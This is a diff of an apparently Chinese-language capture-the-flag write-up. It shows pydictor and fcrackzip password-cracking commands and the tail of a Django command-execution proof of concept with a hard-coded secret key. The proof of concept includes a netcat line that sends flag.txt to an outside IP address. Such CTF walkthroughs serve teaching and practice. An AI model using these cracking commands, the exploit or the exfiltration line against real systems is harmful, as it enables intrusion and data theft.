@@ -21,7 +21,7 @@ python pydictor.py -plug birthday 19900101 20141231 --len 8 8
 fcrackzip -D -p /usr/share/wordlists/rockyou.txt -u crack_this.zip
 ```
 
-找到django命令执行poc
+找到django命令执行poc,shi
 ```
 # !/usr/bin/env python
 # -*- coding:utf-8 -*-
@@ -55,5 +55,4 @@ if __name__ == '__main__':
     SECRET_KEY = 'oa4$kkk802=rfm@tl^e5yb3qvs_ea3r!m*&j+#_+s-9=xcieci'
     command = 'cat flag.txt | nc -4u -w1 45.76.101.190 4444'
     exp(url,SECRET_KEY,command)
-
 ```
